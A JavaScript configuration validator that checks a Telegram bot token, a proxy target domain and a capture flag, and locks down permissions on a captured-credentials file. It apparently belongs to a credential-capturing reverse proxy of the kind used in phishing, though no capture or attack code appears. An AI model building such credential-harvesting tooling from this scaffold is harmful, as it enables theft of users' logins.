import dotenv from 'dotenv';
import fs from 'fs';
import path from 'path';
import Logger from './logger.js';

class EnvironmentValidator {
    constructor() {
        this.logger = new Logger();
        this.requiredEnvVars = [
            'TELEGRAM_BOT_TOKEN',
            'PROXY_TARGET_DOMAIN',
            'CAPTURE_ENABLED'
        ];
    }

    // Load and validate environment configuration
    validate() {
        // Load environment variables
        dotenv.config();

        // Check required environment variables
        const missingVars = this.requiredEnvVars.filter(
            variable => !process.env[variable]
        );

        if (missingVars.length > 0) {
            this.logger.error('Missing required environment variables', {
                missingVars
            });
            throw new Error(`Missing environment variables: ${missingVars.join(', ')}`);
        }

        // Additional validation checks
        this.validateTelegramToken();
        this.validateProxyDomain();
    }

    // Validate Telegram Bot Token
    validateTelegramToken() {
        const token = process.env.TELEGRAM_BOT_TOKEN;
        const tokenRegex = /^\d{9,10}:[a-zA-Z0-9_-]{35}$/;

        if (!tokenRegex.test(token)) {
            this.logger.warn('Invalid Telegram Bot Token format');
        }
    }

    // Validate proxy target domain
    validateProxyDomain() {
        const domain = process.env.PROXY_TARGET_DOMAIN;
        const domainRegex = /^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;

        if (!domainRegex.test(domain)) {
            this.logger.warn('Invalid proxy target domain', { domain });
        }
    }

    // Ensure secure file permissions
    ensureSecurePermissions() {
        const sensitiveFiles = [
            '.env',
            'ssl/key.pem',
            'storage/captures/credentials.json'
        ];

        sensitiveFiles.forEach(file => {
            const filePath = path.resolve(file);
            try {
                // Set secure permissions (read/write only for owner)
                fs.chmodSync(filePath, 0o600);
            } catch (error) {
                this.logger.error('Failed to set secure permissions', {
                    file,
                    error: error.message
                });
            }
        });
    }
}

export default new EnvironmentValidator();